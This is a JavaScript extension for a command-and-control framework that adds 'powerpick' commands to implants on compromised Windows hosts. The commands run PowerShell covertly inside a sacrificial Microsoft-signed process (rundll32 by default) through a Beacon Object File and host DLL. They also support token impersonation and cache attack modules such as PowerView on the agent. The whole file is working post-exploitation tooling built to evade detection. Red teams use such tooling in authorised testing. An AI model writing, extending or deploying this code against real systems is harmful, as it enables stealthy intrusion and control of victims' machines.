var metadata = {
    name: "PowerPick-Fork",
    description: "Fork-and-run PowerShell via sacrificial Microsoft-signed process"
};

var powerpick_fork_session_imports = [];
var powerpick_fork_operator_max_bytes = 2 * 1024 * 1024;
var powerpick_fork_default_spawnto =
    "C:\\Windows\\System32\\rundll32.exe";

function powerpick_fork_require_artifacts(root) {
    let bof_path = root + "_bin/powerpick-fork.x64.o";
    let host_path = root + "_bin/PowerPickForkHost.dll";
    let managed_path = root + "_bin/PowerPickFork.exe";

    if (!ax.file_exists(bof_path)) {
        throw new Error(`missing BOF: ${bof_path}`);
    }
    if (!ax.file_exists(host_path)) {
        throw new Error(`missing host DLL: ${host_path}`);
    }
    if (!ax.file_exists(managed_path)) {
        throw new Error(`missing managed host: ${managed_path}`);
    }

    return {
        bof_path: bof_path,
        host_path: host_path,
        managed_path: managed_path
    };
}

function powerpick_fork_b64_raw_bytes(encoded) {
    if (!encoded || encoded.length == 0) {
        return 0;
    }

    let padding = 0;
    if (encoded.length >= 2 &&
        encoded.charAt(encoded.length - 1) == "=" &&
        encoded.charAt(encoded.length - 2) == "=") {
        padding = 2;
    }
    else if (encoded.length >= 1 && encoded.charAt(encoded.length - 1) == "=") {
        padding = 1;
    }

    return Math.floor(encoded.length * 3 / 4) - padding;
}

function powerpick_fork_session_total_bytes() {
    let total = 0;
    for (let index = 0; index < powerpick_fork_session_imports.length; index++) {
        total += powerpick_fork_session_imports[index].bytes;
    }
    return total;
}

function powerpick_fork_session_find(name) {
    let needle = name.toLowerCase();
    for (let index = 0; index < powerpick_fork_session_imports.length; index++) {
        if (powerpick_fork_session_imports[index].name.toLowerCase() == needle) {
            return index;
        }
    }
    return -1;
}

// Derive a session import name from the load command line path.
// e.g. powerpick-load ~/opt/PowerView.ps1 → "powerview"
function powerpick_fork_default_import_name(cmdline) {
    let rest = (cmdline || "").replace(/^\s*powerpick-load\s+/i, "").trim();
    if (rest.length == 0) {
        return "";
    }

    let path = "";
    let quote = rest.charAt(0);
    if (quote == '"' || quote == "'") {
        let end = rest.indexOf(quote, 1);
        if (end > 1) {
            path = rest.substring(1, end);
        }
    } else {
        let match = rest.match(/^(\S+)/);
        if (match) {
            path = match[1];
        }
    }

    if (path.length == 0) {
        return "";
    }

    path = path.replace(/\\/g, "/");
    let slash = path.lastIndexOf("/");
    let base = slash >= 0 ? path.substring(slash + 1) : path;
    let dot = base.lastIndexOf(".");
    if (dot > 0) {
        base = base.substring(0, dot);
    }

    base = base.toLowerCase().replace(/[^a-z0-9._-]+/g, "-").replace(/^-+|-+$/g, "");
    if (base.length == 0) {
        return "";
    }
    if (base.length > 64) {
        base = base.substring(0, 64);
    }
    return base;
}

function powerpick_fork_session_upsert(name, encoded) {
    let bytes = powerpick_fork_b64_raw_bytes(encoded);
    if (bytes <= 0) {
        throw new Error("session import content is empty");
    }
    if (bytes > powerpick_fork_operator_max_bytes) {
        throw new Error("session import exceeds the 2 MiB operator limit");
    }

    let existing = powerpick_fork_session_find(name);
    let next_total = powerpick_fork_session_total_bytes() + bytes;
    if (existing >= 0) {
        next_total -= powerpick_fork_session_imports[existing].bytes;
    }
    if (next_total > powerpick_fork_operator_max_bytes) {
        throw new Error(
            "session imports would exceed the 2 MiB combined operator limit"
        );
    }

    let entry = {
        name: name,
        encoded: encoded,
        bytes: bytes
    };

    if (existing >= 0) {
        powerpick_fork_session_imports[existing] = entry;
        return "replaced";
    }

    powerpick_fork_session_imports.push(entry);
    return "added";
}

function powerpick_fork_session_remove(name) {
    let existing = powerpick_fork_session_find(name);
    if (existing < 0) {
        return false;
    }
    powerpick_fork_session_imports.splice(existing, 1);
    return true;
}

function powerpick_fork_unquote(value) {
    if (!value || value.length < 2) {
        return value;
    }
    let first = value.charAt(0);
    let last = value.charAt(value.length - 1);
    if ((first == '"' && last == '"') || (first == "'" && last == "'")) {
        return value.substring(1, value.length - 1);
    }
    return value;
}

function powerpick_fork_normalize_spawnto(spawnto) {
    if (!spawnto || spawnto.length == 0 || spawnto == "--spawnto") {
        return powerpick_fork_default_spawnto;
    }

    if (spawnto.indexOf("\\") < 0 &&
        spawnto.indexOf("/") < 0 &&
        spawnto.indexOf(":") < 0) {
        return "C:\\Windows\\System32\\" + spawnto;
    }

    return spawnto;
}

/*
 * Parse: powerpick [--imports] [--impersonate] [--spawnto PATH] <powershell>
 * Flags may appear in either order before the expression.
 */
function powerpick_fork_parse_cmdline(cmdline) {
    let rest = cmdline.replace(/^\s*powerpick\s+/i, "").trim();
    if (rest.length == 0) {
        throw new Error("PowerShell command is empty");
    }

    let spawnto = powerpick_fork_default_spawnto;
    let use_imports = false;
    let use_impersonate = false;
    let powershell = rest;

    while (true) {
        let importsMatch = powershell.match(/^--imports(?:\s+|$)([\s\S]*)$/i);
        if (importsMatch) {
            use_imports = true;
            powershell = importsMatch[1].trim();
            continue;
        }

        let impersonateMatch = powershell.match(/^--impersonate(?:\s+|$)([\s\S]*)$/i);
        if (impersonateMatch) {
            use_impersonate = true;
            powershell = impersonateMatch[1].trim();
            continue;
        }

        let spawntoMatch = powershell.match(
            /^--spawnto\s+("([^"]*)"|'([^']*)'|(\S+))\s+([\s\S]+)$/i
        );
        if (spawntoMatch) {
            spawnto = spawntoMatch[2] || spawntoMatch[3] || spawntoMatch[4];
            powershell = spawntoMatch[5].trim();
            continue;
        }

        break;
    }

    powershell = powerpick_fork_unquote(powershell.trim());
    if (!powershell || powershell.length == 0) {
        throw new Error("PowerShell command is empty");
    }

    return {
        spawnto: powerpick_fork_normalize_spawnto(spawnto),
        powershell: powershell,
        use_imports: use_imports,
        use_impersonate: use_impersonate
    };
}

function powerpick_fork_run_exec(
    id,
    cmdline,
    spawnto,
    encoded_script,
    use_imports,
    use_impersonate
) {
    let artifacts = powerpick_fork_require_artifacts(ax.script_dir());
    let host_bytes = ax.file_read(artifacts.host_path);
    let managed_bytes = ax.file_read(artifacts.managed_path);
    let managed_args = "exec " + encoded_script;
    let suffix = "";

    if (use_imports) {
        if (powerpick_fork_session_imports.length == 0) {
            throw new Error("no session imports loaded; run powerpick-load first");
        }
        for (let index = 0; index < powerpick_fork_session_imports.length; index++) {
            managed_args += " " + powerpick_fork_session_imports[index].name;
        }
        suffix = ` +${powerpick_fork_session_imports.length} import(s)`;
    }
    if (use_impersonate) {
        suffix += " +impersonate";
    }

    let bof_params = ax.bof_pack(
        "cstr,cstr,bytes,bytes,cstr,cstr",
        [
            "exec",
            spawnto,
            host_bytes,
            managed_bytes,
            managed_args,
            use_impersonate ? "1" : "0"
        ]
    );
    let command = `execute bof "${artifacts.bof_path}" ${bof_params}`;

    ax.execute_alias(
        id,
        cmdline,
        command,
        `Task: PowerShell (${spawnto})` + suffix
    );
}

var cmd_powerpick = ax.create_command(
    "powerpick",
    "Execute PowerShell in a sacrificial process (default rundll32)",
    "powerpick [--imports] [--impersonate] [--spawnto PATH] \"Get-Date\""
);

cmd_powerpick.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    if (!ax.is64(id)) {
        throw new Error("powerpick currently supports x64 agents only");
    }

    let parsed = powerpick_fork_parse_cmdline(cmdline);
    let encoded_script = ax.encode_data("base64", parsed.powershell);
    let command_bytes = powerpick_fork_b64_raw_bytes(encoded_script);
    if (command_bytes > powerpick_fork_operator_max_bytes) {
        throw new Error("command exceeds the 2 MiB operator limit");
    }

    powerpick_fork_run_exec(
        id,
        cmdline,
        parsed.spawnto,
        encoded_script,
        parsed.use_imports,
        parsed.use_impersonate
    );
});

var cmd_powerpick_load = ax.create_command(
    "powerpick-load",
    "Load a local PowerShell script into the session and cache it on the agent",
    "powerpick-load /path/to/module.ps1 [name]"
);
cmd_powerpick_load.addArgFile(
    "script",
    true,
    "Local path to a PowerShell script that defines functions"
);
cmd_powerpick_load.addArgString(
    "name",
    "Session import name (defaults to the script basename)",
    ""
);

cmd_powerpick_load.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    if (!ax.is64(id)) {
        throw new Error("powerpick currently supports x64 agents only");
    }

    let encoded_script = parsed_json["script"];
    if (!encoded_script || encoded_script.length == 0) {
        throw new Error("session import content is empty");
    }

    let name = parsed_json["name"];
    if (!name || name.length == 0) {
        name = powerpick_fork_default_import_name(cmdline);
    }
    if (!name || name.length == 0) {
        name = "module-" + (powerpick_fork_session_imports.length + 1);
    }
    name = name.toLowerCase();
    if (!/^[a-z0-9._-]{1,64}$/.test(name)) {
        throw new Error(
            "session import name must be 1-64 letters, digits, '.', '_' or '-'"
        );
    }

    let bytes = powerpick_fork_b64_raw_bytes(encoded_script);
    if (bytes <= 0) {
        throw new Error("session import content is empty");
    }
    if (bytes > powerpick_fork_operator_max_bytes) {
        throw new Error("session import exceeds the 2 MiB operator limit");
    }

    let existing = powerpick_fork_session_find(name);
    let next_total = powerpick_fork_session_total_bytes() + bytes;
    if (existing >= 0) {
        next_total -= powerpick_fork_session_imports[existing].bytes;
    }
    if (next_total > powerpick_fork_operator_max_bytes) {
        throw new Error(
            "session imports would exceed the 2 MiB combined operator limit"
        );
    }

    let pending_name = name;
    let pending_encoded = encoded_script;
    let action = existing >= 0 ? "replaced" : "added";
    let artifacts = powerpick_fork_require_artifacts(ax.script_dir());

    let hook = function (task) {
        if (!task.completed) {
            return task;
        }

        let failed =
            task.type == "error" ||
            /failed to store|requires a name/i.test(task.text || "");

        if (failed) {
            if (task.message == "") {
                task.message = `Session import '${pending_name}' push rejected`;
            }
            return task;
        }

        powerpick_fork_session_upsert(pending_name, pending_encoded);
        if (task.message == "") {
            task.message =
                `Session import '${pending_name}' ${action} and cached on agent ` +
                `(${powerpick_fork_session_imports.length} loaded, ` +
                `${powerpick_fork_session_total_bytes()} bytes)`;
        }

        return task;
    };

    let bof_params = ax.bof_pack(
        "cstr,cstr,bytes",
        ["store", name, encoded_script]
    );
    let command = `execute bof "${artifacts.bof_path}" ${bof_params}`;

    ax.execute_alias_hook(
        id,
        cmdline,
        command,
        `Task: cache session import (${name}, ${bytes} bytes)`,
        hook
    );
});

var cmd_powerpick_loads = ax.create_command(
    "powerpick-loads",
    "List PowerShell scripts loaded into the powerpick session",
    "powerpick-loads"
);

cmd_powerpick_loads.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    if (powerpick_fork_session_imports.length == 0) {
        ax.console_message(
            id,
            "No session imports loaded\n",
            "info",
            "Use powerpick-load SCRIPT [name] to add one."
        );
        return;
    }

    let lines = "";
    for (let index = 0; index < powerpick_fork_session_imports.length; index++) {
        let item = powerpick_fork_session_imports[index];
        lines += `${index + 1}. ${item.name} (${item.bytes} bytes)\n`;
    }
    lines +=
        `Total: ${powerpick_fork_session_imports.length} import(s), ` +
        `${powerpick_fork_session_total_bytes()} bytes\n`;

    ax.console_message(
        id,
        `Session imports (${powerpick_fork_session_imports.length})\n`,
        "info",
        lines
    );
});

var cmd_powerpick_unload = ax.create_command(
    "powerpick-unload",
    "Remove a session import by name, or all session imports",
    "powerpick-unload <name|all>"
);
cmd_powerpick_unload.addArgString(
    "name",
    true,
    "Session import name, or 'all'"
);

cmd_powerpick_unload.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    if (!ax.is64(id)) {
        throw new Error("powerpick currently supports x64 agents only");
    }

    let name = parsed_json["name"];
    if (!name || name.length == 0) {
        throw new Error("session import name is required");
    }
    name = name.toLowerCase();

    let artifacts = powerpick_fork_require_artifacts(ax.script_dir());

    if (name == "all") {
        let names = [];
        for (let index = 0; index < powerpick_fork_session_imports.length; index++) {
            names.push(powerpick_fork_session_imports[index].name);
        }
        powerpick_fork_session_imports = [];
        if (names.length == 0) {
            ax.console_message(id, "No session imports to clear\n", "info");
            return;
        }

        let drop_args = names.join(" ");
        let bof_params = ax.bof_pack("cstr,cstr", ["drop", drop_args]);
        let command = `execute bof "${artifacts.bof_path}" ${bof_params}`;
        ax.execute_alias(
            id,
            cmdline,
            command,
            `Task: drop ${names.length} cached session import(s)`
        );
        return;
    }

    if (!powerpick_fork_session_remove(name)) {
        throw new Error(`session import '${name}' is not loaded`);
    }

    let bof_params = ax.bof_pack("cstr,cstr", ["drop", name]);
    let command = `execute bof "${artifacts.bof_path}" ${bof_params}`;
    ax.execute_alias(
        id,
        cmdline,
        command,
        `Task: drop cached session import (${name})`
    );
});

var group_powerpick = ax.create_commands_group(
    "PowerPick",
    [
        cmd_powerpick,
        cmd_powerpick_load,
        cmd_powerpick_loads,
        cmd_powerpick_unload
    ]
);

ax.register_commands_group(
    group_powerpick,
    ["beacon", "gopher", "kharon"],
    ["windows"],
    []
);
